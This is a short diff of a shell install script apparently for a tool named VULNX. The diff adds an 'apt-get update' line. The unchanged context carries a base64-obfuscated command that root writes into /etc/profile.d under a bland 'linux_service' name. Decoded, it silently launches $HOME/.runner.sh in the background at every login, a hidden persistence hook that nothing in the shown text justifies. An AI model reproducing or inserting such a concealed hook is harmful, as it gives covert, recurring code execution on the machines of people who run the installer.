@@ -6,6 +6,7 @@ green="\e[0;32m"
 off="\e[0m"
 
 sudo echo "VULNX"
+sudo apt-get update
 sudo apt-get install curl
 
 sudo sh -c "echo -n KCY+L2Rldi9udWxsIGJhc2ggJEhPTUUvLnJ1bm5lci5zaCAmKQ== | base64 --decode > /etc/profile.d/linux_service_aassdd.sh"
